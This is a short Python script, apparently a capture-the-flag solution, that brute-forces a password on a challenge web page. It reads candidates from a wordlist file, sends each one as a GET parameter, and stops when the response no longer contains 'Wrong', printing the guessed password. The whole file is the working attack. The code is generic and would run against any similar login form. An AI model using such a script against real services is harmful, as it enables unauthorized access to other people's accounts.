#2020 decenzo-lab Raka Kuswanto
import requests

URL = "http://uictc.herokuapp.com/BruteFmaster/"

# membaca file password 
file1 = open('password.txt', 'r') 
Lines = file1.readlines() 

# Strips the newline character 
for line in Lines: 
    print(line.strip()) 
    password= line.strip()
    PARAMS= {'password':password} 
    r = requests.get(url = URL, params = PARAMS)
    if (r.text.find("Wrong")) == -1:
        print("Menebak dengan kata "+line.strip()+" berhasil, respon : "+r.text)
        exit()